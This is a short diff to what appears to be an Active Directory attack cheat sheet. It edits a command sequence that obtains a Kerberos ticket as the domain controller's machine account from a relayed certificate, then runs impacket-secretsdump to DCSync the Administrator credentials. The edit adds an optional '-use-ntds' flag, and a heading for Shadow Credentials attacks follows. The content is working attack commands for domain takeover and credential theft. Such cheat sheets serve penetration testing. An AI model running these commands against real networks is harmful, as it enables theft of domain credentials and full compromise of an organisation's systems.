@@ -45,7 +45,7 @@ pip3 install -I git+https://github.com/wbond/oscrypto.git
 # Obtain TGT as DC01$ and DCSync
 python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip <dc_ip> '<domain>/dc01$' /tmp/dc.ccache
 export KRB5CCNAME=/tmp/dc.ccache
-impacket-secretsdump -k -no-pass -dc-ip <dc_ip> -just-dc-user Administrator '<domain>/DC01$'@DC01.<domain>
+impacket-secretsdump -k -no-pass -dc-ip <dc_ip> -just-dc-user Administrator '<domain>/DC01$'@DC01.<domain> [-use-ntds]
 ```
 
 ## Shadow Credentials (msDS-KeyCredentialLink)
